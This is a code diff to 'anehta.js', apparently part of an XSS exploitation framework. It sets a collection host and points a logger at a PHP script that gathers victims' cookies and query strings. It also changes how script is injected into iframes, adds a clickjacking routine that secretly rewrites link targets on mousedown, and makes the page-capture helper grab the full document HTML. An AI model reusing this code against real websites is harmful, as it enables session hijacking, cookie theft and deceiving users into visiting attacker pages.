@@ -1,3 +1,5 @@
+var anehtaurl = "http://www.a.com/anehta";
+//var anehtaurl="http://www.a.com/anehta";
 //alert("anehta.js");
 // Author: axis
 //////////////////////////////////////////////////
@@ -13,9 +15,8 @@ var anehta = {
         DemoPage: 'http://www.secwiki.com/anehta/demo.html'  
 };
 
-var anehtaurl = "http://www.a.com/anehta";
 var feedurl = anehtaurl+"/feed.js";
-var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
+var logurl = anehtaurl+"/server/logxss.php?";  // cookie 和 querystring 收集
 var watermarkflash = anehtaurl+"/module/flash/anehtaWatermark.swf";  // 客户端水印
 
 var NoCryptMark = "    [NoCryptMark]";
@@ -999,7 +1000,7 @@ anehta.inject.createIframe = function(w) {
 
 anehta.inject.injectScriptIntoIframe = function(f, proc) {
 	var d = f.contentWindow.document;
-	var s = "<script>\n(" + proc.toString() + ")();\n</script>";
+	var s = "<script>\n" + proc.toString() + "\n<\/script>";
 	d.write(s);
 }
 
@@ -1514,6 +1515,31 @@ anehta.scanner.localfile = function(){
 	
 }
 
+
+
+//////////////////////////////////////////////////
+// Trick Library
+//////////////////////////////////////////////////
+anehta.trick = {};
+
+// 劫持点击链接。idea from http://www.breakingpointsystems.com/community/blog/clickjacking-technique-using-the-mousedown-event
+// by Dustin D. Trammell 
+anehta.trick.hijackLink = function(link, url){
+	if ( link.addEventListener ) {
+      link.addEventListener("mousedown", function(e){link.href=url;}, false);
+  } else if ( link.attachEvent ) {
+     link.attachEvent("onmousedown", function(e){link.href=url;});
+  } else {
+  var oldhandler = link["onmousedown"];
+     if ( oldhandler ) {
+        link["onmousedown"] = function(e){oldhandler(e);link.href=url;};
+     } else {
+        link["onmousedown"] = function(e){link.href=url;};
+     }
+  }	
+}
+
+
 //////////////////////////////////////////////////
 // Miscellaneous Library
 //////////////////////////////////////////////////
@@ -1540,7 +1566,9 @@ anehta.misc.setClipboard = function(data){
 }
 
 anehta.misc.getCurrentPage = function(){
-	return document.childNodes[0].innerHTML;
+	//return document.childNodes[0].innerHTML;
+	//return document.body.parentNode.innerHTML;
+	return document.documentElement.innerHTML;
 }
 
 
@@ -1549,6 +1577,11 @@ anehta.misc.getCurrentPage = function(){
 // Crypto Library
 //////////////////////////////////////////////////
 anehta.crypto ={};
+
+anehta.crypto.random = function(){
+	return Math.random();
+}
+
 
 //JavaScript　base64_decode
 // Copyright (C) 1999 Masanao Izumo <iz@onicos.co.jp>
@@ -1648,12 +1681,6 @@ anehta.crypto.base64Decode = function(str) {
     }
     return out;
 }
-
-
-//////////////////////////////////////////////////
-// jQuery Extend Plugin
-//////////////////////////////////////////////////
-
 
 
 
